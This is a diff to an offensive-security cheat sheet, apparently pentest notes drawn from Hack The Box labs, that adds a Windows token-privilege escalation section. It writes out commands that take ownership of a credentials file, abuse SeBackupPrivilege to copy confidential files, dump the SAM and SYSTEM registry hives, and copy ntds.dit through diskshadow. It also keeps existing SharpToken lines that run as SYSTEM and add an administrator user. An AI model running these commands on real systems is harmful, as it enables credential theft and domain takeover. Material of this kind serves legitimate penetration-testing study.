@@ -77,7 +77,7 @@
     - [SharpUp](#sharpup)
     - [LOLBIN](#lolbin-1)
     - [token](#token-1)
-    - [Psgetsystem](#psgetsystem)
+    - [SePriv](#sepriv)
     - [S4U](#s4u)
     - [ADCS](#adcs)
   - [Linux](#linux-3)
@@ -797,11 +797,43 @@ cd /usr/share/windows-resources/binaries/
 .\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
 .\SharpToken.exe add_user admin Abcd1234! Administrators
 ```
+### SePriv
 #### Full Power
 https://github.com/itm4n/FullPowers
 
-### Psgetsystem
+#### Psgetsystem
 https://github.com/decoder-it/psgetsystem
+
+#### TakeOwn
+https://github.com/fashionproof/EnableAllTokenPrivs
+
+```powershell
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown
+
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+#### BackupPrivilege
+https://github.com/giuliano108/SeBackupPrivilege
+```powershell 
+PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+PS C:\htb> Set-SeBackupPrivilege
+PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+
+
+# SAM SYSTEM
+reg save HKLM\SYSTEM SYSTEM
+reg save HKLM\SAM SAM
+```
+
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
+```powershell
+diskshadow.exe
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+```
+
 
 
 ### S4U
